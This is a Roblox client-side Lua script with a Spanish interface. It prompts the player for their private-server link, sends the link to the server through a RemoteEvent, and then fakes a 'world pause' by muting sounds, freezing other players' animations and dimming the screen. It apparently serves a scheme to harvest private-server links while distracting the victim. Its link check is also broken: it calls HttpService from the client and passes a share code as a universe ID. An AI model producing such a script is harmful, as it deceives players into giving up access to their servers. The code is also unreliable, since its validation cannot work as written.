local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")

-- UI
local ScreenGui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0,400,0,300)
Frame.Position = UDim2.new(0.5,-200,0.5,-150)
Frame.BackgroundColor3 = Color3.new(0.1,0.1,0.1)

local Label = Instance.new("TextLabel", Frame)
Label.Size = UDim2.new(1,-20,0,30)
Label.Position = UDim2.new(0,10,0,10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.new(1,1,1)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox", Frame)
TextBox.Size = UDim2.new(1,-20,0,50)
TextBox.Position = UDim2.new(0,10,0,50)
TextBox.TextColor3 = Color3.new(1,1,1)
TextBox.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
TextBox.ClearTextOnFocus = false

local ErrorLabel = Instance.new("TextLabel", Frame)
ErrorLabel.Size = UDim2.new(1,-20,0,30)
ErrorLabel.Position = UDim2.new(0,10,0,110)
ErrorLabel.TextColor3 = Color3.new(1,0,0)
ErrorLabel.BackgroundTransparency = 1

local Button = Instance.new("TextButton", Frame)
Button.Size = UDim2.new(1,-20,0,50)
Button.Position = UDim2.new(0,10,0,150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.new(0.3,0.3,0.3)
Button.TextColor3 = Color3.new(1,1,1)

-- Botón minimizado
local MiniButton = Instance.new("TextButton", ScreenGui)
MiniButton.Size = UDim2.new(0,100,0,30)
MiniButton.Position = UDim2.new(0,20,0,20)
MiniButton.Text = "Abrir ventana"
MiniButton.Visible = false
MiniButton.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
MiniButton.TextColor3 = Color3.new(1,1,1)

MiniButton.MouseButton1Click:Connect(function()
    Frame.Visible = true
    MiniButton.Visible = false
end)

-- Función para verificar si el VIP server existe
local function isVIPServerValid(link)
    -- Extraer el code
    local code = string.match(link, "roblox.com/share%?code=(%w+)")
    if not code then return false end

    -- Llamada a la API de Roblox para VIP servers
    local success, response = pcall(function()
        return HttpService:GetAsync("https://games.roblox.com/v1/universes/multiget-place-universes?universeIds="..code)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        if data and #data > 0 then
            return true
        end
    end
    return false
end

-- Función para “pausar mundo” solo para el jugador
local function simulateWorldPause()
    for _, sound in pairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end
    for _, sound in pairs(SoundService:GetChildren()) do
        if sound:IsA("Sound") then
            sound.Playing = false
        end
    end
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
                    track:AdjustSpeed(0)
                end
            end
        end
    end
    local overlay = Instance.new("Frame")
    overlay.Name = "FreezeOverlay"
    overlay.Parent = Player:WaitForChild("PlayerGui")
    overlay.Size = UDim2.new(1,0,1,0)
    overlay.BackgroundColor3 = Color3.new(0,0,0)
    overlay.BackgroundTransparency = 0.4
end

-- Botón principal
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    local valid = isVIPServerValid(link)
    if valid then
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        simulateWorldPause()
        Frame.Visible = false
        MiniButton.Visible = true
        ErrorLabel.Text = ""
    else
        ErrorLabel.Text = "El servidor no existe o el link es inválido"
    end
end)
